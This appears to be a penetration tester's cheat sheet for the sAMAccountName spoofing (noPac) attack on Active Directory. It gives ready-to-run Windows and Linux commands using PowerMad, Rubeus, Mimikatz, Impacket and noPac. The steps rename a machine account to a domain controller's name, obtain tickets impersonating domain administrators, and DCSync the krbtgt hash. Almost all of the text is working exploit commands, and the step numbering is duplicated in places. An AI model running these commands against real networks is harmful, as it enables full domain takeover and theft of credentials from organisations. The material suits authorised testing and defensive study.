---
technique: sAMAccountName Spoofing
category: kerberos
targets: Domain Controller (computer account)
protocols: Kerberos, LDAP, SAMR
remote_capable: true
tags: kerberos samaccountname-spoofing cve-2021-42278 cve-2021-42287 s4u2self privilege-escalation ad
---

# sAMAccountName Spoofing

CVE-2021-42278 (no trailing `$` validation on computer `sAMAccountName`) combined with CVE-2021-42287 (KDC appends `$` when a principal is not found during ST lookup) allows a low-privileged user to impersonate a Domain Controller and obtain a service ticket as any domain user, including domain admins. The attack requires control over a computer account (e.g. via MachineAccountQuota) to rename, request a TGT, then rename back before the S4U2self step.

## Windows

### Step 1: Create machine password (PowerMad)

#powershell #powermad #s4u2self

Create the secure string password for the controlled computer object.

```powershell title:"Create secure string machine password"
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
```
<!-- cheat -->

### Step 2: Create machine account (PowerMad)

#powershell #powermad #s4u2self

Create a new machine account to use as the controlled computer object.

```powershell title:"Create machine account with PowerMad"
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "$domain" -DomainController "$dc_fqdn" -Verbose
```
<!-- cheat
import domain_ip
var domain
var dc_fqdn
-->

### Step 3: Clear SPN on machine account (PowerView)

#powershell #powerview #s4u2self

Remove the servicePrincipalName attribute from the controlled computer account.

```powershell title:"Clear SPN on controlled computer account"
Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose
```
<!-- cheat -->

### Step 3: Rename machine account to DC name (PowerMad)

#powershell #powermad #s4u2self

Set the sAMAccountName of the controlled computer to match the DC's name (without trailing `$`).

```powershell title:"Rename machine account sAMAccountName to DC name"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "$dc_name" -Attribute samaccountname -Verbose
```
<!-- cheat
var dc_name
-->

### Step 4: Request TGT as DC name (Rubeus)

#powershell #rubeus #tgt #s4u2self

Request a TGT using the controlled computer's password while it has the DC's sAMAccountName.

```powershell title:"Request TGT as spoofed DC name via Rubeus"
.\Rubeus.exe asktgt /user:"$dc_name" /password:"ComputerPassword" /domain:"$domain" /dc:"$dc_fqdn" /nowrap
```
<!-- cheat
import domain_ip
var domain
var dc_fqdn
var dc_name
-->

### Step 5: Rename machine account back (PowerMad)

#powershell #powermad #s4u2self

Restore the controlled computer's sAMAccountName to its original value before the S4U2self step.

```powershell title:"Restore machine account sAMAccountName to original"
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
```
<!-- cheat -->

### Step 6: S4U2self to impersonate user and inject ticket (Rubeus)

#powershell #rubeus #s4u2self #ptt

Use the TGT to perform S4U2self and obtain an impersonating service ticket, then inject it into the session.

```powershell title:"S4U2self impersonation and pass-the-ticket via Rubeus"
.\Rubeus.exe s4u /self /impersonateuser:"$impersonate_user" /altservice:"ldap/$dc_fqdn" /dc:"$dc_fqdn" /ptt /ticket:"$b64_tgt"
```
<!-- cheat
var dc_fqdn
var impersonate_user
var b64_tgt
-->

### Step 7: DCSync (Mimikatz)

#powershell #mimikatz #dcsync

Use the injected LDAP ticket to perform a DCSync and dump the krbtgt hash.

```powershell title:"DCSync to dump krbtgt via Mimikatz"
lsadump::dcsync /domain:$domain /kdc:$dc_fqdn /user:krbtgt
```
<!-- cheat
var domain
var dc_fqdn
-->

### Step 1: Scan for vulnerability (noPac)

#powershell #automated

Scan the domain for CVE-2021-42278/42287 exploitability using noPac.

```powershell title:"Scan domain for noPac vulnerability"
.\noPac.exe scan -domain "$domain" -user "$user" -pass "$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var domain
-->

### Step 2: Exploit and impersonate Administrator (noPac)

#powershell #automated

Run the full noPac exploit to impersonate Administrator and inject a ticket.

```powershell title:"Exploit noPac to impersonate Administrator"
.\noPac.exe -domain "$domain" -user "$user" -pass "$pass" /dc "$dc_fqdn" /mAccount ControlledComputer /mPassword ComputerPassword /service ldaps /ptt /impersonate Administrator
```
<!-- cheat
import domain_ip
import users
import passwords
var domain
var dc_fqdn
-->

## Linux

### Step 1: Create machine account (addcomputer.py)

#python #impacket #s4u2self #privilege-escalation

Add a new computer account to the domain using Impacket's addcomputer.py.

```sh title:"Create machine account via addcomputer.py"
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host "$rhost_ip" -domain-netbios "$netbios" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var netbios
-->

### Step 2: Clear SPN on machine account (addspn.py)

#python #impacket #s4u2self

Remove all SPNs from the controlled computer account.

```sh title:"Clear SPNs on controlled computer via addspn.py"
addspn.py --clear -t 'ControlledComputer$' -u "$domain/$user" -p "$pass" "$dc_fqdn"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_fqdn
-->

### Step 3: Rename machine account to DC name (renameMachine.py)

#python #impacket #s4u2self

Change the sAMAccountName of the controlled computer to match the DC's name.

```sh title:"Rename machine account sAMAccountName to DC name"
renameMachine.py -current-name 'ControlledComputer$' -new-name "$dc_name" -dc-ip "$rhost_ip" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_name
-->

### Step 4: Request TGT as DC name (getTGT.py)

#python #impacket #tgt #s4u2self

Request a TGT while the controlled computer has the DC's sAMAccountName.

```sh title:"Request TGT as spoofed DC name via getTGT.py"
getTGT.py -dc-ip "$rhost_ip" "$domain/$dc_name:ComputerPassword"
```
<!-- cheat
import domain_ip
var dc_name
-->

### Step 5: Rename machine account back (renameMachine.py)

#python #impacket #s4u2self

Restore the controlled computer's sAMAccountName before performing S4U2self.

```sh title:"Restore machine account sAMAccountName to original"
renameMachine.py -current-name "$dc_name" -new-name 'ControlledComputer$' "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_name
-->

### Step 6: S4U2self to impersonate user (getST.py)

#python #impacket #s4u2self

Use the saved TGT to perform S4U2self and obtain an impersonating service ticket.

```sh title:"S4U2self impersonation via getST.py"
KRB5CCNAME="$dc_name.ccache" getST.py -self -impersonate "$impersonate_user" -altservice "cifs/$dc_fqdn" -k -no-pass -dc-ip "$rhost_ip" "$domain/$dc_name"
```
<!-- cheat
import domain_ip
var dc_name
var dc_fqdn
var impersonate_user
-->

### Step 7: DCSync as impersonated user (secretsdump.py)

#python #impacket #dcsync

Use the impersonating ticket to dump the krbtgt hash via DCSync.

```sh title:"DCSync to dump krbtgt via secretsdump.py"
KRB5CCNAME="$impersonate_user.ccache" secretsdump.py -just-dc-user krbtgt -k -no-pass -dc-ip "$rhost_ip" @"$dc_fqdn"
```
<!-- cheat
import domain_ip
var dc_fqdn
var impersonate_user
-->

### Step 1: Scan for vulnerability (noPac.py)

#python #automated

Scan the domain for CVE-2021-42278/42287 exploitability using noPac.py.

```sh title:"Scan domain for noPac vulnerability via scanner.py"
scanner.py "$domain/$user:$pass" -dc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### Step 2: Exploit and dump credentials (noPac.py)

#python #automated

Run the full noPac exploit to impersonate Administrator and dump credentials.

```sh title:"Exploit noPac and dump credentials via noPac.py"
noPac.py "$domain/$user:$pass" -dc-ip "$rhost_ip" --impersonate Administrator -dump
```
<!-- cheat
import domain_ip
import users
import passwords
-->
